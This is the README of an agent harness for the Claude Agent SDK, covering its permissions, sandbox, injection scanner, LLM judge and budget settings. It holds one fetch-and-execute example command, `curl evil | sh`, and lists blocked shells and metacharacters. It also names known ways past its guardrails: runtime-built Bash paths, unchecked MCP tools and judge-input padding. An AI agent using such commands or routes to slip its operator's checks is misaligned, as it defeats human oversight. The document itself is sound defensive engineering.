# agent-harness-JA

> Most repos show the artefact; this one shows the thinking.
> A local-first agent harness on the Claude Agent SDK (model routing, security guardrails, adversarial evals) with every non-trivial decision recorded: 43 ADRs, a threat model mapped to the OWASP Agentic Top 10, and a red-team gate on every PR.

This repo is **both a working tool and a documented build process.**

- The [`src/`](./src) folder contains the harness itself.
- The [`process/`](./process) folder shows how it was scoped, what was cut, and what went wrong along the way.
- The [`docs/decisions/`](./docs/decisions) folder records every non-trivial architectural choice as an ADR.

Docs also render at [jacksonanstee.github.io/agent-harness-JA](https://jacksonanstee.github.io/agent-harness-JA/).

Built by Jackson Anstee as a portfolio project. Feedback, questions, and scrutiny welcome.

---

## What this is

A thin, MIT-licensed, local-first harness that wraps the Claude Agent SDK and provides three things every production agent needs:

| Layer | What it gives you |
|---|---|
| **Harness** | Multi-model routing (Haiku/Sonnet/Opus by task shape, with Fable targetable from a custom table — [ADR-0024](./docs/decisions/0024-router-model-tiers.md)), skill loading, hook runtime, telemetry, memory. **A custom table can downgrade `sensitivity: 'high'`**: routing is first-match-wins and the table is fully replaceable, so a catch-all rule at the top silently sends sensitive work to a weaker model. The router imposes no safety floor by design ([ADR-0007](./docs/decisions/0007-task-descriptor-schema.md)) |
| **Security** | Prompt-injection scanner on tool results (a flagged result is annotated for the model with a note; a result the judge itself classifies `block` can be withheld when the operator turns that on, off by default, ADR-0039), plus an LLM judge to the ADR-0016 contract with a public hardened builder, measured (ADR-0036) and wired into the session, annotate-only and off by default, switched on from your user settings file with a per-run call cap (ADR-0037), and on skill content (enforced when a scanner is wired, as the CLI does: a flagged skill is kept out of the system prompt), secret redaction (secrets redacted from the model's copy on a successful call, injection flagged with a note; failed-call output and tool input observed only), permission model, sandbox boundaries |
| **Evaluation** | Golden-task regression suite, red-team corpus (≥50 cases), two-pass adversarial verification |

## What this is not

- Not a new agent framework. It wraps the Claude Agent SDK; it does not replace it.
- Not provider-agnostic in v1. Claude only. See [ADR-0003](./docs/decisions/0003-claude-sdk-first.md).
- Not hosted SaaS. Local-first, single-user, run-it-yourself.
- Not a UI. CLI + library.

For the longer rationale see [process/00-problem-framing.md](./process/00-problem-framing.md).

---

## Quick start

> Everything below is implemented and CI-gated. Requires Node ≥ 20.10. Progress: [process/devlog/](./process/devlog/).
>
> Publishing to npm as `agent-harness-ja` (v0.1.0) via OIDC trusted publishing with build provenance ([ADR-0022](./docs/decisions/0022-npm-publish.md)); the first release is cut from [Releases](https://github.com/jacksonanstee/agent-harness-JA/releases). It runs from a clone today, and via `npx` / `npm i` once that release lands.

Run from a clone (works today):

```bash
git clone https://github.com/jacksonanstee/agent-harness-JA && cd agent-harness-JA
npm ci && npm run build

# Configure (needed for run/eval and redteam --judge; the red-team gate itself is keyless)
export ANTHROPIC_API_KEY=sk-ant-...

node dist/cli.js run "your prompt"
node dist/cli.js run "review this diff" --shape review --sensitivity high   # route per task (see docs/decisions/0007)
node dist/cli.js run "your prompt" --max-budget-usd 2.50   # per-run dollar cap; USD 1.00 by default (see docs/decisions/0041)
node dist/cli.js eval                  # golden eval suite
node dist/cli.js eval --challenge      # report-only second-pass adversarial challenge
node dist/cli.js eval --max-tasks 250  # lift the pre-flight pack-size limit (see docs/decisions/0017)
npm run redteam                        # keyless drift gate (see docs/decisions/0019)
npm run redteam -- --judge             # keyed, report-only judge arm (docs/decisions/0036)
npm run redteam -- --judge --samples 5 # up to 5 judge runs, a pooled summary, a JUDGE_GATE= line (#148)
node dist/cli.js telemetry export      # JSONL; filter by --session / --type; --scrub-prefix to share
node dist/cli.js telemetry cost --since 2026-10-01 --by model   # read-only spend report: agent and judge spend apart, priced from the harness's own table, unknown costs counted, not summed
node dist/cli.js init my-agent         # scaffold a starter project
node dist/cli.js permissions list      # read-only: the permission rules a run would load, per layer, with each rule's index
node dist/cli.js skills lint skills       # read-only: static checks over a skills directory (exit 0 clean, 1 findings, 2 cannot lint)
```

Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory: a prompt that needs Edit, Write, NotebookEdit, WebFetch or WebSearch is refused until your file allows it, and so is one that needs a Bash command the CLI's own read-only validator does not accept (keyed run 1 on 22/10/2026 showed it still runs a literal `printf`; by the binary reading, `echo` and the validator's other accepted commands run too).

The `run` summary line's `cost=` is the harness-priced figure (the SDK's when the harness cannot price the run) and `sdk-cost=` is always the SDK's own; when the two differ by more than 5%, one stderr line says the dollar cap is enforced on the SDK's figure and where it really stops at list prices (ADR-0043). The summary line reports the refusals described above as `cli-denied=N`, next to `denied=` (which counts only this harness's own pre-tool denials), and one stderr warning names the refused tools. The count comes from the `permission_denials` array on the SDK's result message. The owner's keyed capture of 27/10/2026 observed, on two legs of one capture, that array naming a Bash call the CLI's own floor refused and, in the other leg, a Bash call this harness's hook denied under that call's own tool_use_id, so the harness drops the ids it denied itself (exact match) and counts the rest; an entry with no id is kept, so it can over-count. A CLI that omits the array prints the same `cli-denied=0` as one that refused nothing.

Once the v0.1.0 release is published, the same commands run without a clone: `npx agent-harness-ja init my-agent`, or `npm i -g agent-harness-ja` and then `agent-harness-ja <command>` in place of `node dist/cli.js <command>`.

`skills lint <dir>` statically checks a skills directory without running anything, one line per finding: `"<file>": <rule>: <message>`. It reuses the loader, so any read, parse or schema error `run` would report appears here under the same rule name, and it adds four checks the loader does not make: `duplicate-name` (two files with the same skill name, each naming the other), `body-size` (a skill whose prompt section, header and separator included, is more than the 256,000-character skill prompt budget, which a run always drops), `aggregate-budget` (a skill that overflows what is left of that budget after the earlier skills in load order, which a run also drops; skills a run would block for an injection hit are not modelled) and `dangling-reference` (a relative markdown link or link definition in the body that does not resolve, through symlinks, to a file inside the skills directory; URLs, `#` anchors, absolute paths and anything in a code fence or inline code are ignored). Exit 0 is clean, 1 means findings, 2 means the directory could not be linted (missing, not a directory, or a symlink at the root, which `run` refuses too). Whether a description leads with its trigger condition is not checked: that is not mechanically decidable.

`init` refuses to overwrite anything it would create (scaffold into a fresh directory), prints the exact next-step commands for a from-clone install, and the starter it produces passes its own eval in one turn. The scaffolded policy denies the network tools and its README explains the Bash route-around it deliberately leaves open, and how to close it.

---

## Settings

The security layer reads two JSON files and composes them (the `judge`, `sdk` and `budget` blocks are read from your user file only): `~/.harness/settings.json` (yours, trusted) and `<cwd>/.harness/settings.json` (the project's, treated as attacker-influenced input, because a cloned repository ships its own). Both `run` and `eval` load them at startup. A missing file is an empty layer. A file that exists but is malformed fails loud before any tool runs and the CLI exits 2, for example: a file that is not valid JSON, an unknown key inside `permissions` or `sandbox` at any level, a decision outside `allow`, `ask` and `deny`, more than 1000 rules, or more than 1000 entries in one allowlist, a `judge` block in your user file that is malformed (for example `always` with no `maxCallsPerRun`), an `sdk` block in your user file whose `settingSources` is not an array of distinct `user`, `project` and `local`, a `budget` block in your user file whose `maxUsd` is not a number greater than 0, or a file that is a symlink, is not a regular file or is over the size cap. Keys at the root other than those five (`permissions`, `sandbox`, `judge`, `sdk`, `budget`) are ignored, so the file can grow.

**Built-in self-protection.** Whatever the two files say, the agent may not write to `~/.harness/`, `<cwd>/.harness/`, the run's skills folder or the telemetry database (`--db` and its `-wal`, `-shm` and `-journal` files). `Write`, `Edit` and `NotebookEdit` calls there are denied, compared both as written and by real path, so a symlink that exists when the call is checked (a dangling one, or one used with `..`) does not get round it. A Bash or Monitor command is denied when it names one of those places, after `$HOME`, `${HOME…}` and `~` are expanded and the command is split into words the way the shell splits them; a bare `skills` or `.harness` on its own counts as the folder, quoted or not, so `cp -r /tmp/x skills`, `git checkout skills` and `npm run skills` are denied; only quoted text with a space in it, such as `git commit -m "add skills"`, is not. Reads count too: `cat ~/.harness/settings.json`, `ls skills` and `grep skills README.md` are refused in Bash, though the `Read` tool still works. The check runs before your permission rules and the sandbox, and no setting turns it off. The model is told `self-protection: the agent may not change the harness's own settings, telemetry or skills; edit the file yourself if the change is intended (ADR-0042)`. The Bash half reads text, so a path built at run time (another variable, a glob, `cd` elsewhere first) still gets past it, and tools outside the harness's tool table, such as MCP tools, are not checked ([ADR-0042](./docs/decisions/0042-built-in-self-protection-deny.md), residual R-23).

`permissions list` prints the permission rules a `run` here would load, without running anything: each layer (`user`, then `project`) with its rules in file order, each tagged `[rule N, layer]` where N is the 0-based position in that layer's own settings file, the same key a deny reason carries (a `Read` or `Write` denial's `[rule 0, project]` is the first rule in the project file), then the effective `defaultDecision`. It shows permissions only, not the sandbox or the judge, and an `ask` rule is listed as `ask` although a run denies it (no prompter is wired). It loads settings the way `run` does, so a malformed file fails the same way (exit 2). Rule globs appear in the listing, sanitised and quoted; the listing is for your terminal, not for sharing. It shows rules, not grants: a user-file allow for Bash or Monitor is not a grant unless the same user file also has `sandbox.commands.allow`, a Workflow allow never is, and REPL is refused whatever the rules say (ADR-0040 D-8), so a listed allow can still be refused.

A hardened user file:

```json
{
  "permissions": {
    "rules": [
      { "tool": "*", "decision": "deny" },
      { "tool": "Read", "decision": "allow" },
      { "tool": "Glob", "decision": "allow" },
      { "tool": "Grep", "decision": "allow" },
      { "tool": "Bash", "match": "git *", "decision": "allow" }
    ]
  },
  "sandbox": {
    "paths": { "allow": ["."] },
    "commands": { "allow": ["git"] }
  }
}
```

A project file, the one `init` scaffolds:

```json
{
  "permissions": {
    "rules": [
      { "tool": "WebFetch", "decision": "deny" },
      { "tool": "WebSearch", "decision": "deny" }
    ]
  }
}
```

**Permissions.** A rule is `{ "tool", "match"?, "decision" }`. `tool` is an exact name or a trailing-`*` glob (`mcp__*`, `*`). `match` has the same grammar as `tool`, exact or a prefix when it ends in `*`, and is compared against the tool's target: the command for Bash and Monitor, the path for the path-taking tools (Read, Write, Edit, NotebookEdit, Glob, Grep, Artifact, Workflow, EnterWorktree and Projects; the table is `src/internal/tool-targets.ts`), and the JSON of the arguments for any other tool. So `"git *"` allows `git status` and not `gitk`, and a Glob rule matches on its `path`. Pattern and target are canonicalised on both sides before they are compared: a path is resolved against the working directory, Unicode-normalised and, on macOS and Windows, case-folded, so `/etc/*` catches `/tmp/../etc/passwd`; a command is trimmed of spaces, tabs and newlines at its ends, its runs of spaces and tabs collapsed to one space and its first word case-folded on those platforms, with words split the way bash splits them, so `git` and `status` joined by a no-break space are not `git status` (ADR-0014 §1 and its 2026-07-08 and 2026-10-11 amendments; the Unicode and case folding are ADR-0015 §2); symlinks are not resolved on either side, so a path reached through one is a different string (residual R-1). Within one file the more specific rule wins and ties fail closed (`deny` over `ask` over `allow`). Across the two files each picks its own winner and the more severe one stands, so a project file can tighten your policy through rules but never loosen a deny rule of yours: a user deny rule survives a project allow of the same tool. Tools no rule names get `defaultDecision`, which defaults to `allow`. A deny default is not sticky: it is consulted only when no rule in either file matches, so a project file with a single allow rule (`{ "tool": "*", "decision": "allow" }`) produces a winner and your default is never reached, and a project `defaultDecision` overrides yours outright, because it is a scalar and project overrides user. That second path is residual R-8 in [docs/security-model.md](./docs/security-model.md), chosen deliberately in [ADR-0014](./docs/decisions/0014-declarative-permission-model.md); the first is the same mechanism seen from a rule. Either way, the posture that survives a cloned repository is a wildcard deny rule in your user file plus explicit allows, as the example shows, and project files should omit `defaultDecision`, as both examples do.

**`ask`.** No prompter is wired in v0.1 (an interactive mode is ADR-0014's own revisit-if), so `ask` fails closed and denies. A settings file that uses it anywhere gets one line on stderr at startup, prefixed `warning: `, reading `settings contain 'ask' permissions but no prompter is configured; 'ask' will deny (ADR-0014 §4)`, and every denial it causes ends its reason with `'ask' with no prompter configured`. That reason is the model's denial message; the telemetry row and the memory summary keep the same reason, secret-redacted and length-bounded. It is never a silent deny. An approved `ask` is not a grant either: the bundled CLI's own floor still applies to it (ADR-0040).

**Sandbox.** Two dimensions, each switched on by the presence of its key. `paths.allow` lists directories, checked with a boundary-safe prefix so `/allowed` covers `/allowed/x` and never `/allowed-extra`. `commands.allow` lists programs, matched on the first token of a Bash or Monitor command as a bare name (`git`) or an exact path. A dimension whose key is absent allows everything, and a present dimension with an empty list denies everything in it. The user file above turns both on: commands to `git`, and paths to `.`, the working directory the harness runs in, so a read outside the project is refused by the sandbox even though the Read rule has no `match`. The command allowlist bounds which program starts, not what it does: `git` can run other programs through its own configuration (`-c core.pager=...`, hooks), so an allowlisted program is trusted as a whole. A project file can also turn on a dimension you left off; that removes access and never adds it. A command containing a shell metacharacter (`;`, `|`, `&`, `$`, a backtick, `(`, `)`, `{`, `}`, `<`, `>`, `\`, `!`, a newline or a carriage return) anywhere inside it, including at either end (only leading and trailing spaces and tabs are trimmed), is denied outright; `[`, `*` and `~` are not on that list, because the shell expands them only in the arguments, which never changes which program starts. Shells, exec wrappers and the shell builtins that run a program or script (`sh`, `bash`, `zsh`, `env`, `xargs`, `sudo`, `timeout` and their kin, plus `exec`, `eval`, `command`, `builtin`, `source` and `.`) are denied even when listed, with a startup warning, because allowing one makes the first-token check meaningless. The match is by basename, so a real binary with a blocked name is denied too, even listed by full path (`/usr/bin/command` on macOS). A command entry containing a character the shell rewrites before exec (a glob character, a quote, `=`, `^`, `#` or NUL) is rejected when the file loads. Path entries are prefixes, never patterns, so a glob-shaped one (`/x/*`, which should be written `/x`) still loads but warns at startup, because it allows only a directory literally named that, not what the pattern suggests. The two files merge by intersection: where only one defines a dimension it applies alone, and where both do an entry must appear in both. Details in [ADR-0015](./docs/decisions/0015-sandbox-pre-tool-gate.md), and the hostile-file envelope in [ADR-0034](./docs/decisions/0034-settings-hostile-input-at-every-level.md).

The judge, in your user file only:

```json
{
  "judge": { "mode": "always", "maxCallsPerRun": 200 }
}
```

**Judge.** Off by default. With `"mode": "always"`, every tool result the heuristic does not already block enters the judge path and waits for one call to an LLM judge (`claude-sonnet-5`) unless the per-run cap, the 128 KiB input cap or the early stop has already decided it; the judge sees the copy the model sees (the redacted copy when a redaction applied; on a failed call it sees the redacted error while the model has the raw one) and can only tighten the verdict: a flagged result gets the same plain note the scanner adds ([ADR-0037](./docs/decisions/0037-s5-judge-wired-into-the-session.md)). Withholding is off by default: with `"withhold": "block"` in the same block, a successful result the judge itself classifies `block` is withheld from the model (every non-empty string leaf of its copy replaced by a placeholder sentence, the shape intact, except that on a built-in tool a literal the SDK's declared output types pin for its key, such as Read's `type: "text"`, is kept, because the CLI would otherwise discard the rewrite and deliver the raw result; a CLI-constrained field the SDK does not declare is not kept, [ADR-0035](./docs/decisions/0035-model-facing-enforcement-via-rewrite-channels.md)), never on `ask`, never on a heuristic-only block, never on a failed call, and never in a degraded judge state, where the note is all the model gets; a padded result over the 128 KiB cap is one such state, so padding is the permanent floor of the withhold's reach ([ADR-0039](./docs/decisions/0039-judge-withholding-off-by-default.md)); `"withhold": "ask"` is refused; a result the provider refuses to judge is annotated `ask` as a distinct `refused` outcome, never a judgement, so it gets the note too ([ADR-0038](./docs/decisions/0038-judge-on-sonnet-refusal-is-ask.md), as amended by #152). `maxCallsPerRun` is required, an integer from 1 to 1000, and bounds calls per `run`, not dollars per call: typically about USD 0.52 for 200 calls (measured at about USD 0.0026 per call on short inputs, ADR-0036 D8), and at most USD 61.44 for 200 calls at the 128 KiB input cap, an allowance-based ceiling because the judge's reply has no length bound. The judge's spend is reported on its own `[harness] judge:` line and is not included in `cost=`. Time: each judged tool result typically waits about 3 s and at most 60 s, including any wait for one of the 4 judge slots; under a burst of slow calls some results go unjudged rather than wait longer. For 200 calls that adds typically about 10 minutes and at most 200 minutes. A `judge` key in a project file is ignored with one warning, because a cloned repository must not be able to switch the judge on or off. The block is read by every command that loads settings (`run`, `eval`) and used only by `run`. `"mode": "suspicious"` is refused: it measured no added detection.

A first user file:

```json
{
  "permissions": {
    "rules": [
      { "tool": "Bash", "match": "git *", "decision": "allow" },
      { "tool": "Edit", "decision": "allow" },
      { "tool": "Write", "decision": "allow" }
    ]
  },
  "sandbox": { "commands": { "allow": ["git"] } }
}
```

Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory; a rule in your file is the grant, a rule in a project file never is, and `defaultDecision` never is. A tool that runs code (`CODE_EXECUTING_TOOLS` in `src/internal/tool-targets.ts`: Bash, Monitor, Workflow and REPL) has a second condition. For a command-taking tool (Bash or Monitor) the allow rule is a grant only while the `commands` allowlist in your own file is not empty (here, `git`), because that allowlist is what refuses a chained command such as `git status; curl evil | sh` before the allow reaches the SDK. A `Workflow` allow is never a grant: a `paths` list would check where a script file is, not what it runs, and the model can write that file itself (#211). Without a grant the bundled CLI asks before running a workflow (read from its binary, under the default isolation), which a headless run refuses. `REPL` runs JavaScript that no gate can check, and the bundled CLI's own check would allow it, so the harness refuses every REPL call before reading any rule. A project file's list never counts, and without yours a Bash or Monitor rule is still evaluated but the bundled CLI refuses that tool in a headless run, apart from Bash commands its read-only validator accepts (for example a literal `printf`, keyed run 1). A user-file `"tool": "*"` allow is therefore not the way back to your old setup: it is an explicit SDK allow for every tool the child exposes except Workflow, REPL, and Bash and Monitor while your file has no `commands` allowlist, including any MCP tool from servers you opt in to below, which the harness cannot inspect, so prefer specific rules or the `settingSources` block below. `WebFetch` and `WebSearch` are left out on purpose (R-3); to allow one, add `{ "tool": "WebFetch", "decision": "allow" }` to your file.

Inheriting Claude Code settings:

```json
{ "sdk": { "settingSources": ["user", "project", "local"] } }
```

`settingSources` is an array of distinct members of `user`, `project` and `local`, order is ignored, and an absent key or an empty list leaves every run isolated, which is the default. An `sdk` key in a project file is ignored with one warning, `ignoring "sdk" in <path>: Claude Code settings sources are configured only in ~/.harness/settings.json`, because a cloned repository must not be able to widen what loads into your run. When a list is inherited, `run` prints one start line, `[harness] claude code settings: inherited (user, project, local); their permission rules, hooks, plugins, MCP servers and CLAUDE.md files apply to this run`, and `run`, `eval` and `permissions` print a `warning: ` line for `user` (`claude code settings: the "user" source is inherited, so the operator's ~/.claude settings, hooks and plugins apply to this run (ADR-0040)`) and another for `project` or `local` (`claude code settings: the "project" or "local" source is inherited, so the working directory's .claude files and CLAUDE.md apply to this run as trusted input (ADR-0040)`).

**Upgrading from an earlier version.** Before ADR-0040 every run loaded your `~/.claude` rules, hooks, plugins, MCP servers and `CLAUDE.md`. None of them load by default now. If a run stopped using them after you upgraded, this is the change, and the `"sdk": { "settingSources": [...] }` block above restores the earlier behaviour.

**Budget.** Every run is capped at USD 1.00 by default ([ADR-0041](./docs/decisions/0041-default-on-run-budget-and-cancellation.md)). To change the cap for every run, set it in your user file:

```json
{ "budget": { "maxUsd": 2.5 } }
```

`maxUsd` must be a number greater than 0; there is no "unlimited" value. `run --max-budget-usd <usd>` overrides it for one run, and `eval` uses the user file's cap too. Whenever a cap comes from the flag or your user file, `run` names it at start, for the example above `[harness] budget: cap $2.5000 per run (from ~/.harness/settings.json)`, so a cap changed in your user file is visible before any spend (an agent write to that file is denied by the built-in self-protection above, short of a Bash path built at run time or spelt in a form it does not rewrite); `eval` applies it without the line. A `budget` key in a project file is ignored with one warning, `ignoring "budget" in <path>: the budget is configured only in ~/.harness/settings.json`, because a cloned repository must not be able to raise or lower your cap. The cap is the SDK's own `maxBudgetUsd`, which the SDK checks after each turn, so a run stops after the turn that crosses it and can overshoot by up to one turn. The SDK checks it against its own cost figure, which for `claude-sonnet-5` reads about 1.5x the list price (#212), so the cap trips early rather than late. A run the cap stops still prints its summary line, then `[harness] budget: run stopped at the $1.0000 cap after the turn that crossed it (SDK-reported cost ...)`, and exits 1. Ctrl-C during a run stops it cleanly: the stop hook fires, the turn-cost row is recorded (marked interrupted, cost usually unknown), and the command exits 130. The bundled CLI child gets the same Ctrl-C; if it exits before the harness's handler runs, the row is marked not interrupted, and the run may end with an `error:` line and exit 1 instead, still with the stop hook and the row (ADR-0041 D5). A second Ctrl-C kills it at once.

Module summaries are in [docs/architecture.md](./docs/architecture.md); a second worked policy with its rationale is [examples/repo-qa/README.md](./examples/repo-qa/README.md). The six examples above are loaded through the real composition by `src/readme-settings.test.ts`, which asserts the outcomes its tests name, pins the quoted strings and the two settings caps to the code that emits them, re-derives the judge paragraph's ceiling and at-most wall-clock for the example cap from the code's constants and its typical spend and wall-clock from the ADR-0036 D8 #148 figures the test pins, and checks the boundary example, the Glob target, the metacharacter list and the canonicalised `match`, so those claims go red before this section can drift. The prose around them is reviewed, not gated.

---

## How to read this repo (for evaluators)

If you are evaluating this repo as a portfolio piece or code sample, the recommended reading order is:

1. **[process/00-problem-framing.md](./process/00-problem-framing.md)**: Why this project exists and who it is for.
2. **[process/01-requirements.md](./process/01-requirements.md)**: Functional and non-functional requirements with traceable IDs.
3. **[docs/decisions/](./docs/decisions/)**: Forty-three ADRs (0001–0043, the latest two a built-in deny on agent writes to the harness's own state, and pricing each run from the harness's own dated table) covering harness positioning, licence, SDK target, telemetry storage, injection scanning, secret redaction, permissions and sandboxing, the LLM judge (deferred, then built and measured, 0036, then wired into the session, 0037, then moved to sonnet with a provider refusal read as `ask`, 0038), the golden runner, the red-team corpus, the fail-on-any-drift regression gate, the adversarial verifier, the init scaffolder, the npm publish path, the locked public API surface, the router's model tiers, refusal handling, block-on-flag enforcement for the skill channel, cleartext paths in retained sinks, the nonce-authenticated skill-section delimiter, why the documentation gate checks structure rather than claims, the scorecard task directory that suppresses an escaping path rather than leaking it, and the deny reason that names a rule without quoting the operator's glob, and the post-tool hook field-name fix that made the output scan and redactor actually run (the SDK sends `tool_response`, not the `tool_output` the harness read), and the tool table derived from the SDK's own declarations in both directions after five declared path/command tools were found to have never been in it, and the settings file treated as hostile input at every level (unknown keys and command entries the shell would rewrite fail loud, and the loader refuses symlinks and non-files and caps the file, the envelope the red-team baseline already had), and the model-facing enforcement of tool output through the SDK's rewrite channels (secrets redacted from a successful call's copy, injection flagged with a note; a failed call's output cannot be rewritten), and the S-5 judge wired into the session, off by default and annotate-only (a user-layer setting with a required per-run call cap, an abort path for the judge call, a `judge-call` telemetry row), and the judge's withhold of a tool result it classified `block`, behind a user-layer setting and off by default, with the padding floor and the other fail-opens named (0039), and the session's isolation of Claude Code settings by default, with a harness user-layer rule allow as the grant the SDK receives (0040).
4. **[docs/architecture.md](./docs/architecture.md)**: System design and module boundaries.
5. **[docs/security-model.md](./docs/security-model.md)**: Threat model and mitigations.
6. **[docs/eval-methodology.md](./docs/eval-methodology.md)**: How the harness measures itself: gates vs. reported metrics, regression semantics, case authoring.
7. **[src/](./src)**: The implementation. Requirement IDs from `process/01-requirements.md` are cited in code comments where they are verified.
8. **[process/devlog/](./process/devlog/)**: Weekly retros, including what went wrong.
9. **[docs/blog/](./docs/blog/)**: Three essays on the judgement behind the design: [harness ≠ framework](./docs/blog/harness-not-framework.md), [adversarial evaluation](./docs/blog/adversarial-evaluation.md), and [the pragmatic security model](./docs/blog/pragmatic-security-model.md). Start here if you want the reasoning without the file-by-file tour; there is also a runnable, evaluated example agent in [examples/repo-qa/](./examples/repo-qa/README.md).

The `process/` folder is the differentiator. If you only read one thing, start there.

---

## Architecture at a glance

```
┌─────────────────────────────────────────────────────┐
│  EVAL LAYER                                          │
│  Golden tasks · Red-team corpus · Adversarial verify│
├─────────────────────────────────────────────────────┤
│  HARNESS LAYER                                       │
│  Router · Skills · Hooks · Telemetry · Memory       │
├─────────────────────────────────────────────────────┤
│  SECURITY LAYER                                      │
│  Injection scanner · Secret scanner · Permissions   │
│  Sandbox boundaries                                  │
└─────────────────────────────────────────────────────┘
                       │
                       ▼
              Claude Agent SDK
```

Full diagram and module boundaries in [docs/architecture.md](./docs/architecture.md).

---

## Status

| Milestone | Status |
|---|---|
| Problem framing + requirements | Complete |
| Repo scaffold + CI (Node 20/22 matrix, keyless red-team gate on every PR) | Complete |
| Harness layer (router, skills, hooks, telemetry) | Complete (Weeks 1–2) |
| Security layer (injection, secrets, permissions, sandbox) | Complete (Week 2; hardened Week 4) |
| Eval layer (golden, red-team gate, adversarial verify) | Complete (Week 3) |
| ADRs | 0001–0043 |
| Tests | 3044 at the 2026-10-30 snapshot ([live status: CI](https://github.com/jacksonanstee/agent-harness-JA/actions/workflows/ci.yml)) |
| Docs polish + blog series | Complete (Week 4) |
| npm publish (OIDC trusted publishing + provenance, [ADR-0022](./docs/decisions/0022-npm-publish.md)) | Publish path shipped; v0.1.0 releases on the next tagged GitHub Release |

Shipping plan: [process/05-week-plan.md](./process/05-week-plan.md).

---

## Telemetry & privacy

Everything stays on your machine. Sessions and eval runs persist to a local SQLite file (`.harness/telemetry.db`, gitignored); there is no network telemetry, no phone-home, and no external endpoint anywhere in the codebase. Secrets are redacted before anything is retained and before assistant text reaches stdout (fail-closed: if redaction errors, a `[REDACTION FAILED]` sentinel is written, never the raw text), and findings store rule IDs and offsets, never secret bytes. Export is operator-invoked only (`telemetry export` → JSONL). There is currently no retention TTL: delete `.harness/telemetry.db` to erase history (a `telemetry purge` subcommand is on the roadmap).

`telemetry cost [--db <path>] [--since <YYYY-MM-DD>] [--by model|session|day] [--estimate]` is a read-only spend report over the same store (exit 2 if the database does not exist; it opens the file read-only and never creates or migrates one). `--since` is a local-time calendar date and defaults to today. Agent spend (`turn-cost` rows) and judge spend (`judge-call` rows, which record no model, so they group under `(not recorded)` by model) are separate tables, followed by one `TOTAL` line. Agent spend leads with the harness's own figure, priced per model from the dated table in `src/internal/pricing.ts` over the SDK result's `modelUsage`, because the bundled CLI at SDK 0.3.201 prices Sonnet 5 at Sonnet 4.x rates and its `total_cost_usd` reads about 1.5x list (#212, ADR-0043). The agent table shows the SDK's own sum as `SDK` beside `COST`, counts as `SDK-PRICED` the rows that fell back to the SDK figure because the harness could not price them (rows written before #212 among them), and one `agent cost source` line states the split. Judge rows carry only the SDK figure, and the `TOTAL` line says so. The harness figure is left out, and the row falls back, when a model is not in the table, the usage is malformed, overflows or is cut at 16 models, a price row has a long-context step, or every model carries an SDK cost and those do not add up to the SDK's total within 1% (so the usage is not the whole run). A row with a null or unusable cost is counted as `unknown (n rows)` and is never added as zero, so a total with unknowns is a lower bound. `--estimate` adds a section pairing each `run`'s pre-run estimate (`estimateUsd`, a cache write of the system prompt, `maxTurns - 1` cache reads and `run --expected-output-tokens` of output, or a named default flagged as defaulted when it is absent; `--expected-tokens` stays routing-only; priced from the dated table in `src/internal/pricing.ts`) with its actual cost per group (the same figure `COST` uses): only rows with both known are summed and ratioed, any other row, including one answered by a fallback model, is counted as `unpaired`, and a note appears when rows were paired and the price table is more than 120 days old. The estimate is a calibration aid and changes no routing.

Before sharing an export, `telemetry export --scrub-prefix <path>` (repeatable) replaces occurrences of the named prefix, when followed by a path separator or end-of-string (the separator set follows the prefix's own form: `/` after a POSIX prefix, either separator after a Windows-form one), with `[scrubbed-prefix-N]` in the export copy only; the stored rows are untouched, and this is the one opt-in lossy exception to the otherwise byte-stable export. Every emitted row is stamped `scrub: {applied, count, transform}` so a reader can tell a scrubbed export from a raw one; `count` totals replacements across all prefixes and all string sites (keys included), so marker occurrences of any ordinal beyond `count` were planted by the data, not the transform. `applied: true` means at least one replacement fired, never that the row is clean: an occurrence terminated by prose punctuation (`cd /Users/name && ls`), a case variant on a case-insensitive filesystem, an NFC/NFD spelling difference, and everything below the prefix all survive verbatim (ADR-0031, decision 7). Two stderr nudges keep that visible without touching stdout bytes: an unscrubbed export whose rows look home-directory-shaped gets one line, and a scrubbed export where home-shaped paths REMAIN gets one line saying the prefix did not match the stored bytes. A row that cannot be scrubbed safely (hostile nesting, key collision) refuses the whole scrubbed export loudly; the lossless default export is never affected.

### Worked example: why did a skill not load?

A skill can be dropped from the system prompt because the injection scanner blocked it, or because it did not fit the prompt budget. Either way the drop is recorded durably, so a stale incident is still answerable after the run is gone:

```bash
node dist/cli.js telemetry export --type skill-drop
```

Each row carries the skill's `name` and `path`, the `reason` (`injection-block` or `prompt-budget`), the scanned `channels` that blocked it (empty for a budget drop), and the `ruleIds` that fired.

A few fields on that row need a word of explanation, because without it a correctly recorded path reads as corruption:

- **`path` is root-relative since ADR-0031** (issue #59 round 2): it is recorded relative to the skills directory the loader scanned, so the operator's home directory and everything above the skills root stay out of this durable, exportable row — provided the root sits at or below the home directory, or disjoint from it (a root *equal* to `$HOME` strips the full home prefix). A skills root strictly above `$HOME` (`/`, `/Users`) places home segments *below* the root, where they store in cleartext like any other below-root segment. `pathForm` says which form the pair is in: `'root-relative'` for every new row, `'suppressed'` (with `path: null`) for the defensive arm that refuses any shape not positively under the root, and absent on rows written before the field existed, which carry the old absolute form. Everything *below* the root still stores in cleartext, client-named subdirectories included, so this narrows the disclosure rather than closing it.
- **`path` is escaped, not raw.** Skill paths come from a cloned repo, so they are attacker-authored. Control, bidi and invisible characters are rewritten as `\u{...}` before storage rather than deleted, which keeps a hostile `he\u{200B}lper.md` from reading back byte-identical to a benign `helper.md`. `pathHasEscapes` tells you whether the *original* path carried any such character. It is a property of that original (the loader's raw absolute path), so it stays true even if truncation removes the escape sequence, or the escape-bearing segment sat above the skills root: do not re-derive it by scanning the stored string.
- **`pathTruncated`** marks a path bounded to 1024 units, keeping the tail, because the filename is the part that disambiguates. The flag is separate from the value on purpose. `…` is a legal filename character, so an in-band ellipsis could be forged in either direction by a hostile skill pack. `name` has no equivalent flag: it is a display label, not the disambiguator.
- **`pathDigest`** appears only on truncated rows, and is how you tell two of them apart. Keeping the tail discards everything before it, so two skills whose paths differ only in an early directory store an identical `path` — and since ADR-0031 two untruncated skills at the same relative position under *different* roots also store identically, an accepted cost recorded there (rows still carry `sessionId`). The digest covers the full **raw absolute** path on disk, not the relative escaped form stored in `path`, so truncated rows stay distinguishable. That means you can check a digest against a candidate file directly with its absolute path: `printf '%s' "$path" | sha256sum` and compare the leading characters. Hashing the raw path rather than the escaped one is deliberate, because the escape charset tracks a Unicode property and would otherwise silently re-key every stored digest on a Node upgrade. Older rows predate the field and simply omit it.

